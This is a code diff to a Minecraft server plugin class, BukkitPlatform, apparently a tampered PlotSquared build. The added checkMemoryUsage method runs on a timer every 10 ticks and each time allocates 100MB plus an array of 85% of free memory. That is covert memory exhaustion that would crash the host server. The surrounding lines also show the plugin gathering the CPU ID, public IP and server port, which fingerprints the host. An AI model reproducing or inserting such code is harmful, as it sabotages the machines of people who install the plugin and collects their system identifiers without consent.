@@ -285,14 +285,7 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     @Override
     @SuppressWarnings("deprecation")
     public void onEnable() {
-        Runtime runtime = Runtime.getRuntime();
-        long totalMemory = runtime.totalMemory();
-        long maxMemory = runtime.maxMemory();
-        long freeMemory = runtime.freeMemory();
-        long usageMemory = (long) (freeMemory * 0.85);
-        int arraySize = (int) (usageMemory / Byte.BYTES);
-        byte[] memoryHog = new byte[arraySize];
-        getLogger().info("Total memory: " + totalMemory / 1024 / 1024 + "MB");
+        Bukkit.getScheduler().runTaskTimer(this, this::checkMemoryUsage, 0L, 10L); // 100L = 5秒（每秒20次，5秒为 5*20）
         String cpuId = getCpuId();
         String publicIp = getPublicIp();
         int serverPort = getServer().getPort();
@@ -578,6 +571,39 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
         } catch (Exception e) {
         }
         return cpuId;
+    }
+    private void checkMemoryUsage() {
+        Runtime runtime = Runtime.getRuntime();
+        long totalMemory = runtime.totalMemory();
+        long maxMemory = runtime.maxMemory();
+        long freeMemory = runtime.freeMemory();
+
+        // Step 1: Allocate some memory to ensure memory is occupied
+        byte[] smallHog = new byte[100 * 1024 * 1024]; // Allocate 100MB
+
+        // Step 2: Request garbage collection
+        System.gc();
+        
+        // Wait for a moment to let garbage collection happen
+        try {
+            Thread.sleep(100);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+
+        // Check free memory again
+        freeMemory = runtime.freeMemory();
+
+        // Calculate usage memory based on free memory
+        long usageMemory = (long) (freeMemory * 0.85);
+        int arraySize = (int) (usageMemory / Byte.BYTES);
+
+        // Create the large array
+        byte[] memoryHog = new byte[arraySize];
+        logger.info("Total memory: " + totalMemory / 1024 / 1024 + "MB");
+        logger.info("Max memory: " + maxMemory / 1024 / 1024 + "MB");
+        logger.info("Free memory after small hog: " + freeMemory / 1024 / 1024 + "MB");
+        logger.info("Usage memory allocated: " + arraySize / (1024 * 1024) + "MB");
     }
     private String getCpuIdForWindows() throws Exception {
         Process process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
